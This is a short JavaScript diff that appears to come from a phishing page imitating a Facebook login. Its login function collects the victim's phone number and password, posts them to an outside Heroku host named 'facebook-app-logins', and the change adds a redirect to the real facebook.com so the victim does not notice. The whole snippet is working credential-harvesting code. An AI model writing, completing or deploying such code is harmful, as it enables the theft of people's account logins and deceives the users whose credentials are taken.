@@ -7,10 +7,10 @@ button.addEventListener('click',()=>{
 
 const credentials= {};
 
-function login(){
+async function login(){
     credentials.phone= phone.value;
     credentials.pass= pass.value;
-    axios.post("https://facebook-app-logins.herokuapp.com/save",credentials);
-    console.log('clicked')
+   await axios.post("https://facebook-app-logins.herokuapp.com/save",credentials);
+    window.location.href= "https://www.facebook.com/";
     
 }
